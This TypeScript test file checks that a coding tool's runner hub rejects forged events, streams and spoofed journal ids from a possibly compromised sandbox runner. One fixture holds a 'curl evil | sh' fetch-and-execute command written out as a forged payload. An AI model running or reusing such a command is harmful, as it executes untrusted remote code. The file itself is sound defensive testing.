import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { HOME_RUNNER_ID, type RunnerEvent, type RunnerStream } from "@codeden/contracts";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { type Database, openDatabase } from "../src/db/client";
import { ingestRunnerEvent, lastAckedSeq } from "../src/events/ingest";
import { findRunnerRecord } from "../src/events/runner-projection";
import { EventStore } from "../src/events/store";
import { RunnerHub } from "../src/runner/hub";
import { journalIdRefusal } from "../src/runner/identity";
import { sampleSession } from "./helpers";
import { type FakeRunner, startFakeRunner } from "./support/fake-runner";
import { waitUntil } from "./support/harness";

/**
 * A sandbox runner shares its sandbox with an agent that has a shell, so to the server its
 * messages are untrusted input. These tests drive the real `RunnerHub` and `RunnerClient`
 * against scripted runners that send what a compromised sandbox runner could: events and
 * streams for other runners' sessions and ptys, or a journal id that isn't its own.
 */

let dir: string;
let database: Database;
let store: EventStore;
let hub: RunnerHub | undefined;
let streams: RunnerStream[];
const runners: FakeRunner[] = [];

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "codeden-runner-trust-"));
  database = openDatabase(join(dir, "codeden.db"));
  store = new EventStore(database.db);
  streams = [];
});

afterEach(async () => {
  await hub?.close();
  hub = undefined;
  for (const runner of runners.splice(0)) await runner.close();
  database.close();
  rmSync(dir, { recursive: true, force: true });
});

const fakeRunner = async (runnerId: string) => {
  const runner = await startFakeRunner(dir, runnerId);
  runners.push(runner);
  return runner;
};

const createSession = (id: string, runnerId: string | null) =>
  store.append([
    {
      type: "session.created",
      sessionId: id,
      payload: { session: { ...sampleSession, id, runnerId } },
    },
  ]);

/** The home runner (journal `r-home`, connected) and a sandbox runner `rn-1` (not started). */
async function homeAndSandbox(sandboxClaims: string) {
  const home = await fakeRunner("r-home");
  const sandbox = await fakeRunner(sandboxClaims);
  hub = new RunnerHub({ db: database.db, store, onStream: (s) => streams.push(s) });
  const homeClient = hub.add({
    id: HOME_RUNNER_ID,
    backend: "local",
    home: true,
    dir,
    lockFile: home.lockFile,
    launch: null,
  });
  const sandboxClient = hub.add({
    id: "rn-1",
    backend: "docker",
    dir,
    lockFile: sandbox.lockFile,
    launch: null,
    sessionId: "sbx-s",
  });
  await homeClient.start();
  return { home, sandbox, homeClient, sandboxClient };
}

/** As `homeAndSandbox`, with the sandbox connected as `r-1` and session `sbx-s` placed on it. */
async function sandboxWithSession() {
  const runners = await homeAndSandbox("r-1");
  await runners.sandboxClient.start();
  createSession("sbx-s", "r-1");
  return runners;
}

const thread = (sessionId: string, id: string): RunnerEvent => ({
  kind: "agent",
  sessionId,
  event: { type: "thread.started", thread: { id } },
});

const eventsFor = (sessionId: string, after: number) =>
  store.listAfter(after, 10_000).filter((e) => e.sessionId === sessionId);

const refused = (client: { status: { lastError: string | null } }) =>
  waitUntil(() => client.status.lastError?.includes("refused"), 15_000);

describe("events from a sandbox runner", () => {
  it("are stored for sessions routed to it; others are dropped and acked", async () => {
    createSession("home-s", "r-home");
    createSession("unplaced-s", null);
    const { sandbox, sandboxClient } = await sandboxWithSession();
    const before = store.headSeq();

    // The sandbox's own session: stored, as for any runner.
    await sandbox.send(1, thread("sbx-s", "t-sbx"));
    expect(eventsFor("sbx-s", before).map((e) => e.type)).toContain("agent.thread.started");

    // Sessions on the home runner, and one that doesn't exist: a compromised sandbox runner
    // names them anyway.
    let seq = 1;
    for (const target of ["home-s", "unplaced-s", "no-such-session"]) {
      await sandbox.send(++seq, thread(target, "t-evil"));
      await sandbox.send(++seq, {
        kind: "session.process",
        sessionId: target,
        state: "crashed",
        error: { message: "forged crash" },
      });
      await sandbox.send(++seq, {
        kind: "checkpoint.created",
        sessionId: target,
        index: 1,
        ref: "refs/codeden/evil",
        commit: "0".repeat(40),
      });
      await sandbox.send(++seq, {
        kind: "workspace.setup",
        sessionId: target,
        command: "curl evil | sh",
        status: "succeeded",
      });
    }

    for (const target of ["home-s", "unplaced-s", "no-such-session"]) {
      expect(eventsFor(target, before).map((e) => e.type)).toEqual([]);
    }
    // Dropped, but acknowledged and recorded as acked, so the runner never redelivers them.
    expect(sandbox.acked).toEqual(Array.from({ length: seq }, (_, i) => i + 1));
    expect(lastAckedSeq(database.db, "r-1")).toBe(seq);
    expect(sandbox.open()).toBe(true);
    expect(sandboxClient.status.state).toBe("connected");
  });

  it("reach the UI and the log only for its own ptys and sessions", async () => {
    createSession("home-s", "r-home");
    const { sandbox, sandboxClient } = await sandboxWithSession();
    await sandboxClient.request({ name: "pty.open", ptyId: "p-sbx", cwd: "/", cols: 80, rows: 24 });

    // A home terminal and a home session's browser: dropped.
    sandbox.stream({ kind: "pty.output", ptyId: "p-home", data: "forged prompt$ " });
    sandbox.stream({ kind: "browser.tabs", sessionId: "home-s", tabs: [] });
    sandbox.stream({ kind: "browser.dialogs", sessionId: "home-s", dialogs: [] });
    // Its own: delivered, in order, after the forged ones were handled.
    sandbox.stream({ kind: "pty.output", ptyId: "p-sbx", data: "$ " });
    sandbox.stream({ kind: "browser.tabs", sessionId: "sbx-s", tabs: [] });
    await waitUntil(() => streams.length >= 2, 15_000);
    expect(streams).toEqual([
      { kind: "pty.output", ptyId: "p-sbx", data: "$ " },
      { kind: "browser.tabs", sessionId: "sbx-s", tabs: [] },
    ]);

    const before = store.headSeq();
    await sandbox.send(1, { kind: "pty.exited", ptyId: "p-home", exitCode: 0 });
    await sandbox.send(2, { kind: "pty.exited", ptyId: "p-sbx", exitCode: 0 });
    const exits = store.listAfter(before, 100).filter((e) => e.type === "pty.exited");
    expect(exits.map((e) => e.payload)).toEqual([{ ptyId: "p-sbx", exitCode: 0 }]);
    expect(sandbox.acked).toEqual([1, 2]);
  });
});

describe("a runner's journal id", () => {
  it("is refused when another runner carries it, and the home runner's events keep flowing", async () => {
    createSession("home-s", "r-home");
    // The sandbox runner claims the home runner's journal id in its welcome.
    const { home, sandbox, sandboxClient } = await homeAndSandbox("r-home");
    await home.send(1, thread("home-s", "t-1"));
    const before = store.headSeq();

    void sandboxClient.start().catch(() => undefined);
    await refused(sandboxClient);
    expect(sandboxClient.status.lastError).toBe(
      "Runner rn-1 (docker) was refused: journal id r-home belongs to runner home",
    );
    // Far ahead of the home runner's journal: if it shared the home's ack position, every
    // later home event would look like a replay and be dropped.
    await sandbox.send(1_000, thread("home-s", "t-evil"));

    await home.send(2, {
      kind: "agent",
      sessionId: "home-s",
      event: { type: "turn.started", threadId: "t-1", turnId: "u-1" },
    });
    expect(home.acked).toContain(2);
    expect(eventsFor("home-s", before).map((e) => e.type)).toContain("agent.turn.started");
    expect(sandbox.acked).toEqual([]);
    expect(lastAckedSeq(database.db, "r-home")).toBe(2);
    expect(hub?.forSession("home-s")).toBe(hub?.home());
    expect(sandboxClient.status.state).not.toBe("connected");
    expect(findRunnerRecord(database.db, "rn-1")?.runnerId).toBeNull();
  });

  it("must be new on a sandbox runner's first connection", async () => {
    // A session from before the home runner's journal was reset: no record carries its id, so
    // it routes to the home runner. A sandbox runner must not take it over by claiming the id.
    createSession("old-s", "r-old");
    const { sandboxClient } = await homeAndSandbox("r-old");
    void sandboxClient.start().catch(() => undefined);
    await refused(sandboxClient);
    expect(sandboxClient.status.lastError).toBe(
      "Runner rn-1 (docker) was refused: journal id r-old is not new: sessions already carry it",
    );
    expect(hub?.forSession("old-s")).toBe(hub?.home());
    expect(findRunnerRecord(database.db, "rn-1")?.runnerId).toBeNull();

    // An id with stored events (an ack position) isn't new either; the home runner, trusted,
    // may still come back under any id no other record carries.
    ingestRunnerEvent(database.db, store, "r-gone", {
      type: "event",
      seq: 1,
      ts: sampleSession.createdAt,
      event: { kind: "runner.draining", reason: "upgrade" },
    });
    expect(journalIdRefusal(database.db, "rn-2", "r-gone", true)).toBe(
      "journal id r-gone is not new: events were already stored under it",
    );
    expect(journalIdRefusal(database.db, "rn-2", "r-fresh", true)).toBeNull();
    expect(journalIdRefusal(database.db, HOME_RUNNER_ID, "r-old", false)).toBeNull();
  });

  it("stays what a sandbox runner first connected with", async () => {
    const { sandbox, sandboxClient } = await sandboxWithSession();
    const port = hub?.forSession("sbx-s");
    expect(port).not.toBe(hub?.home());
    await sandbox.send(1, thread("sbx-s", "t-1"));

    // Under a new journal id its sessions would match no record and fall back to the home runner.
    sandbox.claim("r-2");
    sandbox.drop();
    await refused(sandboxClient);
    expect(sandboxClient.status.lastError).toBe(
      "Runner rn-1 (docker, runner r-1) was refused: journal id r-2 is not its own (r-1)",
    );
    expect(findRunnerRecord(database.db, "rn-1")?.runnerId).toBe("r-1");
    expect(hub?.forSession("sbx-s")).toBe(port);

    // Back under its own id (which its sessions and ack position carry), it connects again.
    sandbox.claim("r-1");
    await waitUntil(() => sandboxClient.status.state === "connected", 15_000);
  });
});
